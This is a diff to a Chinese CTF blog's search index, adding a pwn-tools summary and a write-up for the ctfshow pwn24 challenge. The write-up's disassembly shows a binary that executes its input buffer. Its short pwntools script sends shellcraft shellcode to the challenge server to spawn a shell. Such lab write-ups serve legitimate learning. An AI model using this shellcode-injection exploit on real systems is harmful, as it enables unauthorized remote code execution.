@@ -423,7 +423,11 @@
     <title>pwn 知识点汇总</title>
     <url>/2024/11/14/ctfpwn/pwn-%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本篇只给出原博客地址，方便review而已。</p>
-<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="计算机指令系统"><a href="#计算机指令系统" class="headerlink" title="计算机指令系统"></a>计算机指令系统</h2><h3 id="指令寻址"><a href="#指令寻址" class="headerlink" title="指令寻址"></a>指令寻址</h3><p>作者：<a href="https://www.zhihu.com/people/chen-hao-dong-34-27">鸫鸫鹅</a>：<a href="https://zhuanlan.zhihu.com/p/370204019">关于寻址方式一篇就够了</a></p>
+<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="重要工具"><a href="#重要工具" class="headerlink" title="重要工具"></a>重要工具</h2><ul>
+<li><a href="/2024/11/14/ctfpwn/tools/pwn%E5%B7%A5%E5%85%B71-pwntools%E6%A8%A1%E5%9D%97/" title="pwn工具1 pwntools模块">pwntools</a>
+</li>
+</ul>
+<h2 id="计算机指令系统"><a href="#计算机指令系统" class="headerlink" title="计算机指令系统"></a>计算机指令系统</h2><h3 id="指令寻址"><a href="#指令寻址" class="headerlink" title="指令寻址"></a>指令寻址</h3><p>作者：<a href="https://www.zhihu.com/people/chen-hao-dong-34-27">鸫鸫鹅</a>：<a href="https://zhuanlan.zhihu.com/p/370204019">关于寻址方式一篇就够了</a></p>
 <h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="plt表与got表及elf的安全属性"><a href="#plt表与got表及elf的安全属性" class="headerlink" title="plt表与got表及elf的安全属性"></a>plt表与got表及elf的安全属性</h4><ul>
 <li><a href="/2024/11/13/transship/%E8%BD%AC%E8%BD%BD0001-plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A81/" title="转载0001 plt表和got表1">转载0001-plt表和got表1</a></li>
 <li><a href="/2024/11/13/transship/%E8%BD%AC%E8%BD%BD0002-plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A82/" title="转载0002 plt表和got表2">转载0002-plt表和got表2</a></li>
@@ -470,7 +474,8 @@
 <p>总之大费周章最后终于装完了。</p>
 <h2 id="pwntools的组件"><a href="#pwntools的组件" class="headerlink" title="pwntools的组件"></a><code>pwntools</code>的组件</h2><p>命令行中输入<code>pwn</code>可以看到pwntools中包括的工具。<br><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">asm,checksec,constgrep,cyclic,debug,disasm,disablenx,elfdiff,elfpatch,errno,hex,libcdb,phd,pwnstrip,scramble,shellcraft,template,unhex</span><br></pre></td></tr></table></figure></p>
 <h3 id="checksec工具"><a href="#checksec工具" class="headerlink" title="checksec工具"></a><code>checksec</code>工具</h3><a href="/2024/11/14/ctfpwn/tools/pwn%E5%B7%A5%E5%85%B73-%E7%9F%A5%E8%AF%86%E7%82%B91-checksec%E5%8F%8Aelf%E7%9A%84%E5%AE%89%E5%85%A8%E5%B1%9E%E6%80%A7/" title="pwn工具3&#x2F;知识点1 checksec及elf的安全属性">checksec介绍</a>
-<h3 id="cyclic工具"><a href="#cyclic工具" class="headerlink" title="cyclic工具"></a><code>cyclic</code>工具</h3><a href="/2024/11/12/ctfpwn/wp/ctfshow-pwn25-WP/" title="ctfshow-pwn25 WP">使用cyclic的实践</a>
+<h3 id="cyclic工具"><a href="#cyclic工具" class="headerlink" title="cyclic工具"></a><code>cyclic</code>工具</h3><a href="/2024/11/12/ctfpwn/wp/ctfshow-pwn25-WP/" title="ctfshow-pwn25 WP">使用cyclic的实践-ctfshow-pwn25(ret2libc)</a>
+<h3 id="shellcraft工具"><a href="#shellcraft工具" class="headerlink" title="shellcraft工具"></a><code>shellcraft</code>工具</h3><a href="/2024/11/14/ctfpwn/wp/ctfshow-pwn24-WP/" title="ctfshow-pwn24 WP">使用shellcraft的实践-ctfshow-pwn24(ret2text)</a>
 <h3 id="敬请期待，还没用到"><a href="#敬请期待，还没用到" class="headerlink" title="敬请期待，还没用到"></a>敬请期待，还没用到</h3>]]></content>
       <categories>
         <category>ctf</category>
@@ -606,6 +611,39 @@
         <tag>pwn</tag>
         <tag>知识点</tag>
         <tag>工具</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ctfshow-pwn24 WP</title>
+    <url>/2024/11/14/ctfpwn/wp/ctfshow-pwn24-WP/</url>
+    <content><![CDATA[<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="题面提示"><a href="#题面提示" class="headerlink" title="题面提示"></a>题面提示</h2><p>题目给出提示可以使用shellcraft脚本生成shell。</p>
+<h2 id="分析pwn文件"><a href="#分析pwn文件" class="headerlink" title="分析pwn文件"></a>分析pwn文件</h2><p>使用<code>exeinfope</code>查看可执行文件类型。发现是32位elf文件</p>
+<p>使用<code>IDA</code>对pwn文件反编译。</p>
+<p>看到hint：<br><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Hint  : NX disabled &amp; Has RWX segments</span><br></pre></td></tr></table></figure></p>
+<p>结合题目提示发现可能是ret2text的题型。</p>
+<p>进入ctfshow函数中，IDA无法生成该函数的伪代码，其汇编如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">buf= byte ptr -88h</span><br><span class="line">var_4= dword ptr -4</span><br><span class="line"></span><br><span class="line">push    ebp</span><br><span class="line">mov     ebp, esp</span><br><span class="line">push    ebx</span><br><span class="line">sub     esp, 84h</span><br><span class="line">call    __x86_get_pc_thunk_bx</span><br><span class="line">add     ebx, (offset _GLOBAL_OFFSET_TABLE_ - $)</span><br><span class="line">sub     esp, 4</span><br><span class="line">push    100h            ; nbytes</span><br><span class="line">lea     eax, [ebp+buf]</span><br><span class="line">push    eax             ; buf</span><br><span class="line">push    0               ; fd</span><br><span class="line">call    _read</span><br><span class="line">add     esp, 10h</span><br><span class="line">sub     esp, 0Ch</span><br><span class="line">lea     eax, [ebp+buf]</span><br><span class="line">push    eax             ; s</span><br><span class="line">call    _puts</span><br><span class="line">add     esp, 10h</span><br><span class="line">lea     eax, [ebp+buf]</span><br><span class="line">call    eax</span><br><span class="line">nop</span><br><span class="line">mov     ebx, [ebp+var_4]</span><br><span class="line">leave</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>
+<ul>
+<li>发现该函数用<code>_read</code>读入了buf字符串，然后用<code>_puts</code>函数输出了buf字符串。</li>
+<li><strong>最关键的是：第四个<code>call</code>直接将buf字符串（数据段）当作代码段执行</strong></li>
+</ul>
+<p>确定是ret2text的题型，现在只需要输入shell执行代码的机器码即可</p>
+<h2 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>, <span class="string">&quot;28174&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(asm(shellcraft.sh()))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p><img src="/image/post/ctf/pwn/wp/ctfshow-pwn24-wp/1.png" alt=""></p>
+<center>拿到shell</center>
+
+<p><img src="/image/post/ctf/pwn/wp/ctfshow-pwn24-wp/2.png" alt=""></p>
+<center>拿到flag</center>]]></content>
+      <categories>
+        <category>ctf</category>
+        <category>pwn</category>
+        <category>wp</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>wp</tag>
+        <tag>pwn</tag>
+        <tag>ret2text</tag>
       </tags>
   </entry>
 </search>
